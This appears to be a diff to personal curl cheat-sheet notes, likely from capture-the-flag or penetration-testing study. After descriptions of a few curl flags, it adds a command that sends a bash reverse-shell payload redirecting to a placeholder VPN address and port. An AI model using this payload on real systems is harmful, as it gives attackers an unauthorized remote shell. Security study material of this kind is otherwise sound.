@@ -10,3 +10,6 @@
 			-X    'GET   POST  ("requestMethod")'
 			-I    'Fetch the headers only'
 			-k    'This option makes curl skip the verification step and proceed without checking'
+
+
+::: curl -s -X requestMethod "http://$(mvnb)/........" -d '/bin/bash -c "/bin/bash -i >& /dev/tcp/ip_vpn_here/port_vpn_here 0>&1"'
